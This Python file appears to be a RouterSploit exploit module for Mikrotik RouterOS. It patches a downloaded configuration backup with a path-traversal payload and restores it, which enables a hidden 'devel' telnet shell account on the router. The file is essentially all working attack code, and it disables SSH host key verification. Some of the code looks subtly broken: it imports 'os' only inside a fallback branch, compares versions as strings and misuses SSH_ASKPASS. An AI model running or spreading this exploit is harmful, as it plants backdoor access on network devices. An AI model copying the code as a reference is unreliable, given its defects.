from subprocess import Popen, PIPE
from struct import pack, unpack

from routersploit import (
    exploits,
    mute,
    print_error,
    print_status,
    print_success
)

try:
    from subprocess import DEVNULL  # py3k
except ImportError:
    import os
    DEVNULL = open(os.devnull, 'wb')


class Exploit(exploits.Exploit):
    """ Exploit template. """
    __info__ = {
        'name': 'Mikrotik RouterOS Jailbreak',
        'authors': [
            '',  # vulnerability discovery
            'GH0st3rs',  # routersploit module
        ],
        'description': 'Create "devel" user on RouterOS from 2.9.8 to 6.41rc56',
        'references': [
            '',
        ],
        'devices': [
            'Mikrotik',
        ],
    }

    target = exploits.Option('', 'Target address e.g. 192.168.88.1')
    port = exploits.Option(80, 'Target Port')
    login = exploits.Option('admin', 'Target Username')
    password = exploits.Option('', 'Target Password')

    def run(self):
        print_status("Verifying version...")
        if self.check():
            print_success("Target appears to be vulnerable")
            # Create system backup
            output = self.ssh_command('/system backup save name="backup.backup" dont-encrypt=yes')
            if 'backup saved' not in output:
                output = self.ssh_command('/system backup save name="backup.backup"')
                if 'backup saved' not in output:
                    print_error('Unable to export current configuration.')
                    return

            local_backup_path = '/tmp/backup'
            print_status("Downloading current configuration...")
            self.scp_command('%s@%s:%s' % (self.login, self.target, '/backup.backup'), local_backup_path)

            print_status("Patching...")
            status = self.patch_backup(local_backup_path)
            if not status:
                print_error('Unable to patch current configuration.')
                return

            print_status("Uploading exploit...")
            self.scp_command(local_backup_path, '%s@%s:%s' % (self.login, self.target, '/backup.backup'))
            output = self.ssh_command('/system backup load name="backup.backup" password=""')
            if 'configuration restored' not in output:
                output = self.ssh_command('/system backup load name="backup.backup"')
                if 'configuration restored' not in output:
                    print_error('Unable to apply patched configuration.')
                    return

            print_success("Congrats! Jailbreak was (likely) successfull.")
            print_success("Linux mode can be accessed via telnet using user 'devel' with admin's password.")

    @mute
    def check(self):
        output = self.ssh_command('/system resource print')
        if not output:
            print_error('Unable to connect to %s:22 with user %s' % (self.target, self.login))
            return False

        self.arch = list(filter(lambda x: 'architecture-name' in x, output.splitlines()))[0].split(':')[1].strip()
        version = list(filter(lambda x: 'version' in x, output.splitlines()))[0].split(':')[1].strip()
        if version.find('rc') >= 0:
            version, rc = version.split('rc')
            if version == '6.41' and rc >= '61':
                print_error('Software %s is not supported by this tool. The last supported versoin is 6.41rc56.' % version)
                return False
        else:
            version = version.split(' ')[0]
        if version < '2.9.8':
            print_error('Software %s is not supported by this tool. The first supported version is 2.9.8.' % version)
            return False
        elif version >= '6.42':
            print_error('Software %s is not supported by this tool. The last supported versoin is 6.41rc56.' % version)
            return False
        return True

    def ssh_command(self, command):
        proc = Popen(
            [
                'ssh',
                '-oHostKeyAlgorithms=+ssh-dss',
                '-oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1',
                '-oUserKnownHostsFile=/dev/null',
                '-oStrictHostKeyChecking=no',
                '-l', self.login,
                self.target,
                command
            ],
            stdout=PIPE, stderr=DEVNULL,
            env={'SSH_ASKPASS': self.password}
        )
        output = proc.communicate()[0].decode()
        return output

    def scp_command(self, file_1, file_2):
        proc = Popen(
            [
                'scp',
                '-oHostKeyAlgorithms=+ssh-dss',
                '-oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1',
                '-oUserKnownHostsFile=/dev/null',
                '-oStrictHostKeyChecking=no',
                file_1,
                file_2
            ],
            stdout=PIPE, stderr=DEVNULL,
            env={'SSH_ASKPASS': self.password}
        )
        output = proc.communicate()[0].decode()
        return output

    def patch_backup(self, file):
        realsize = os.path.getsize(file)
        with open(file, 'r+b') as backup:
            if realsize < 8 or backup.read(4) != "\x88\xAC\xA1\xB1":
                print_error("Please check that this is a recent RouterOS backup file w/o password protection.")
                return False
            matchsize, = unpack("<I", backup.read(4))
            if matchsize != realsize:
                print_error("File is damaged. Will not proceed.")
                return False
            # first we write our payload
            backup.seek(matchsize)
            backup.write("\x1E\x00\x00\x00\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2E\x2F" +
                         "\x6E\x6F\x76\x61\x2F\x65\x74\x63\x2F\x64\x65\x76\x65\x6C\x2D" +
                         "\x6C\x6F\x67\x69\x6E\x2F\x00\x00\x00\x00\x00\x00\x00\x00")
            # finally we need to increase the size by 42
            matchsize += 42
            backup.seek(4)
            backup.write(pack("<I", matchsize))
            backup.close()
            print_success('Done')
            return True
